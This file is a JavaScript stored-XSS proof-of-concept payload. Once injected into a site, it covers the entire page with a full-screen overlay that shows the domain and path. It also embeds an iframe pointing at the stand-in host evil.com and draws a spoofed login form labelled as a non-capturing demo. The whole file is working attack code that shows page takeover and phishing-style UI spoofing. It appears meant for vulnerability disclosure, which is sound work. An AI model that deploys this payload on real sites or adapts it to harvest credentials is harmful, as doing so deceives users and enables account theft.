(function () {
  alert('Stored XSS executed on ' + location.host);

  const wrapper = document.createElement('div');
  wrapper.style.cssText = `
    position:fixed;
    top:0; left:0;
    width:100%;
    height:100%;
    z-index:999999;
    display:flex;
    background:#111;
    color:#fff;
    font-family:Arial,sans-serif;
  `;

  const panelStyle = `
    flex:1;
    padding:15px;
    box-sizing:border-box;
    border-right:1px solid #333;
    overflow:auto;
  `;

  // Panel 1 — XSS proof
  const p1 = document.createElement('div');
  p1.style.cssText = panelStyle;
  p1.innerHTML = `
    <h2>✅ Stored XSS</h2>
    <p>Persistent JavaScript execution.</p>
    <p><b>Domain:</b> ${document.domain}</p>
    <p><b>Path:</b> ${location.pathname}</p>
  `;

  // Panel 2 — Iframe injection
  const p2 = document.createElement('div');
  p2.style.cssText = panelStyle;
  p2.innerHTML = `
    <h2>🧩 Arbitrary Iframe Injection</h2>
    <iframe
      src="https://evil.com"
      style="width:100%;height:80%;border:1px solid #555;background:#fff">
    </iframe>
  `;

  // Panel 3 — Mock login (interactive, non-functional)
  const p3 = document.createElement('div');
  p3.style.cssText = panelStyle;
  p3.innerHTML = `
    <h2>⚠ Phishing UI Capability (PoC)</h2>
    <p style="color:#ff9800">
      Interactive demo — no data is captured or submitted.
    </p>

    <form onsubmit="return false">
      <label>Username</label><br>
      <input
        type="text"
        placeholder="Enter username"
        style="width:100%;padding:8px;margin:5px 0"
      ><br>

      <label>Password</label><br>
      <input
        type="password"
        placeholder="Enter password"
        style="width:100%;padding:8px;margin:5px 0"
      ><br>

      <button
        type="button"
        style="
          width:100%;
          padding:10px;
          background:#1976d2;
          color:#fff;
          border:none;
          cursor:pointer;
        "
        onclick="alert('Demo only — no credentials processed')"
      >
        Login
      </button>
    </form>

    <p style="font-size:12px;margin-top:10px;color:#aaa">
      Demonstrates realistic UI spoofing via Stored XSS.
    </p>
  `;

  wrapper.appendChild(p1);
  wrapper.appendChild(p2);
  wrapper.appendChild(p3);
  document.body.appendChild(wrapper);
})();
